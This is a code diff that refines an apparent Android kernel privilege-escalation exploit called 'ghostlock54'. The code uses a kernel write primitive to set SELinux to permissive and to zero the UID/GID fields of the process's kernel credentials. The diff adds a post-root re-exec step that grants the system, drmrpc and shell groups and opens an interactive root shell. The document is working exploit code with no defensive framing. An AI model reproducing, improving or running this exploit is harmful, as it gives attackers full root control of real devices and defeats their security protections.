@@ -2,6 +2,7 @@
 
 #include <errno.h>
 #include <fcntl.h>
+#include <grp.h>
 #include <linux/futex.h>
 #include <linux/capability.h>
 #include <linux/perf_event.h>
@@ -516,7 +517,8 @@ static int read_enforce(void) {
 
 static int write_value(uint64_t target, uint64_t value) {
   static const unsigned windows[] = {0xa80, 0xb00, 0xb80, 0xc00, 0xc80};
-  k_fake_lock2 = k_selinux_state + windows[fake_lock_index++ % 5];
+  if (fake_lock_index >= sizeof(windows) / sizeof(windows[0])) return 0;
+  k_fake_lock2 = k_selinux_state + windows[fake_lock_index++];
   atomic_store(&respray_parent, (target - 8) & ~UINT64_C(3));
   atomic_store(&respray_value, value);
   atomic_store(&respray_lock, k_fake_lock2);
@@ -537,8 +539,47 @@ static void ignore_terminal_signals(void) {
   (void)sigaction(SIGQUIT, &ignore, NULL);
 }
 
+static int post_root_shell(void) {
+  struct __user_cap_header_struct cap_hdr = {
+    .version = _LINUX_CAPABILITY_VERSION_3,
+    .pid = 0,
+  };
+  struct __user_cap_data_struct cap_data[2] = {{0}};
+  if (syscall(SYS_capget, &cap_hdr, cap_data) != 0 ||
+      !(cap_data[0].effective & (UINT32_C(1) << CAP_SETGID))) {
+    fprintf(stderr, "[-] post-exec CAP_SETGID verification failed\n");
+    return 31;
+  }
+
+  gid_t groups[64];
+  int group_count = getgroups(63, groups);
+  if (group_count < 0) {
+    fprintf(stderr, "[-] post-exec getgroups failed: %s\n", strerror(errno));
+    return 31;
+  }
+  static const gid_t required_groups[] = {1000, 1026, 2000};
+  for (unsigned wanted = 0;
+       wanted < sizeof(required_groups) / sizeof(required_groups[0]); wanted++) {
+    int present = 0;
+    for (int i = 0; i < group_count; i++)
+      if (groups[i] == required_groups[wanted]) present = 1;
+    if (!present) groups[group_count++] = required_groups[wanted];
+  }
+  if (setgroups((size_t)group_count, groups) != 0) {
+    fprintf(stderr, "[-] post-exec adding drmrpc failed: %s\n",
+            strerror(errno));
+    return 31;
+  }
+  printf("[+] post-exec CAP_SETGID + system/drmrpc/shell groups verified\n");
+  execl("/system/bin/sh", "sh", "-i", (char *)NULL);
+  fprintf(stderr, "[-] shell exec failed: %s\n", strerror(errno));
+  return 31;
+}
+
 int main(int argc, char **argv) {
   setvbuf(stdout, NULL, _IONBF, 0);
+  if (argc == 2 && strcmp(argv[1], "--post-root") == 0)
+    return post_root_shell();
   stage_fd = open("/data/local/tmp/ghostlock54.stage",
                   O_WRONLY | O_CREAT | O_CLOEXEC, 0600);
   record_stage('0');
@@ -646,7 +687,10 @@ int main(int argc, char **argv) {
   }
   printf("[+] SELinux permissive verified\n");
 
-  static const unsigned id_offsets[] = {0x4, 0xc, 0x14, 0x1c};
+  /* Zero real/effective UID+GID and fsgid+securebits.  On the post-root exec,
+   * Linux copies effective IDs into saved/filesystem IDs and legacy UID 0
+   * raises permitted/effective capabilities from the 0xc0 bounding set. */
+  static const unsigned id_offsets[] = {0x4, 0x14, 0x20};
   for (unsigned i = 0; i < sizeof(id_offsets) / sizeof(id_offsets[0]); i++) {
     if (!write_value(k_current_cred + id_offsets[i], 0)) {
       fprintf(stderr, "[-] cred id write trigger failed\n");
@@ -661,7 +705,8 @@ int main(int argc, char **argv) {
     fprintf(stderr, "[-] root/permissive verification failed\n");
     return 7;
   }
-  record_stage('9');
+
+  record_stage('A');
   ignore_terminal_signals();
   printf("[+] ROOT + permissive verified; entering direct shell\n");
   pid_t shell = fork();
@@ -677,7 +722,8 @@ int main(int argc, char **argv) {
     (void)sigaction(SIGHUP, &defaults, NULL);
     (void)sigaction(SIGINT, &defaults, NULL);
     (void)sigaction(SIGQUIT, &defaults, NULL);
-    execl("/system/bin/sh", "sh", "-i", (char *)NULL);
+    execl("/data/local/tmp/ghostlock54", "ghostlock54", "--post-root",
+          (char *)NULL);
     _exit(30);
   }
   close(STDIN_FILENO);
